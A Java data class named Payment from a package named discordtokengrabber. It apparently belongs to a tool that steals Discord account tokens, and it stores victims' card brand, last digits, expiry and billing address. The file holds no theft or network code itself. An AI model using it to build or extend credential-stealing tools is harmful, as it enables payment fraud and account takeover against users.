package com.github.dedinc.discordtokengrabber.objects;

public class Payment {

    private String brand;
    private String lastNumbers;
    private String country;
    private int expiresMonth;
    private int expiresYear;
    private Address billingAddress;
    private boolean isDefault;

    public Payment(String brand,
                   String lastNumbers,
                   String country,
                   int expiresMonth,
                   int expiresYear,
                   Address billingAddress,
                   boolean isDefault) {
        this.brand = brand;
        this.lastNumbers = lastNumbers;
        this.country = country;
        this.expiresMonth = expiresMonth;
        this.expiresYear = expiresYear;
        this.billingAddress = billingAddress;
        this.isDefault = isDefault;
    }

    public String getBrand() {
        return brand;
    }

    public String getLastNumbers() {
        return lastNumbers;
    }

    public String getCountry() {
        return country;
    }

    public int getExpiresMonth() {
        return expiresMonth;
    }

    public int getExpiresYear() {
        return expiresYear;
    }

    public Address getBillingAddress() {
        return billingAddress;
    }

    public boolean isDefault() {
        return isDefault;
    }
}
